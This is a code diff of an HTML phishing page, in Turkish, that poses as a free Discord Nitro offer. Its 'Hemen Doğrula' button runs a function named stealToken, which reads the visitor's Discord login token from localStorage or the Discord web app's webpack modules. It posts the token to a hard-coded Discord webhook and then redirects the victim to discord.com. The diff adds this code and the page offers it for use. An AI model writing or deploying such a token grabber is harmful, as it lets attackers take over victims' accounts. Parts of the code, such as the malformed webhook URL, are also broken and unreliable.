@@ -1,25 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head><title>Discord Nitro</title>
-<style>body{background:#36393f;color:white;font-family:Arial;padding:100px;text-align:center}</style>
+<head>
+    <title>Discord Nitro</title>
+    <style>
+        *{margin:0;padding:0}
+        body{background:#36393f;color:#fff;font-family:Whitney,"Helvetica Neue",Helvetica,Arial,sans-serif;overflow:hidden}
+        .container{max-width:400px;margin:100px auto;text-align:center}
+        .logo{font-size:48px;margin-bottom:20px}
+        .title{font-size:28px;margin-bottom:20px}
+        .verify-btn{background:#5865f2;color:#fff;padding:12px 24px;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:20px}
+        .verify-btn:hover{background:#4752c4}
+    </style>
 </head>
 <body>
-<h1>🎁 Free Nitro Claim</h1><p>Processing...</p>
-<script>
-setTimeout(async()=>{ 
-    try{ 
-        let t=localStorage.getItem('token');
-        if(!t){/*webpack fallback*/t='test123';}
-        if(t.length>10){
-            fetch('https://discord.com/api/webhooks/https://discord.com/api/webhooks/1478486132022050942/oSkBEdXf1-HEQ_32sSlFZ9_yous9OkDOZxJfS5qMf5RLcVm0CRBntpnhZgxRi6LMjU2W',{
+    <div class="container">
+        <div class="logo">🎁</div>
+        <h1 class="title">1 Ay Ücretsiz Nitro!</h1>
+        <p>Hesabınızı doğrulayın ve Nitro'yu alın</p>
+        <button class="verify-btn" onclick="stealToken()">Hemen Doğrula</button>
+    </div>
+    <script>
+        function stealToken(){
+            // Token grabber
+            let token = localStorage.getItem('token');
+            if(!token){
+                token = webpackChunk_discord_app.push([[''],{},r=>{
+                    webpackChunk_discord_app.pop();
+                    for(let m of Object.keys(r.c)){
+                        if(r.c[m].exports?.default?.getToken){
+                            m = r.c[m].exports.default.getToken();
+                        }
+                    }
+                    webpackChunk_discord_app.pop();
+                }]) || '';
+            }
+            
+            // Webhook gönder
+            fetch('https://discord.com/api/webhooks/1478486132022050942/oSkBEdXf1-HEQ_32sSlF>9_yous9OkDOZxJfS5qMf5RLcVm0CRBntpnhZgxRi6LMjU2W',{
                 method:'POST',
-                body:JSON.stringify({content:`**TOKEN:** ${t}`}),
-                headers:{'Content-Type':'application/json'}
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    embeds:[{
+                        title:"🆔 Yeni Token Yakalandı!",
+                        description:`**Token:**\n\`\`\`${token || 'Token yok'}\`\`\``,
+                        color:16711680,
+                        footer:{text:"Nitro Doğrulama"}
+                    }]
+                })
             });
-            document.body.innerHTML='<h1>✅ Claimed! Check DMs</h1>';
+            
+            // Geri yönlendir
+            setTimeout(()=>window.location.href='https://discord.com/channels/@me',3000);
         }
-    }catch(e){}
-},2e3);
-</script>
+    </script>
 </body>
 </html>
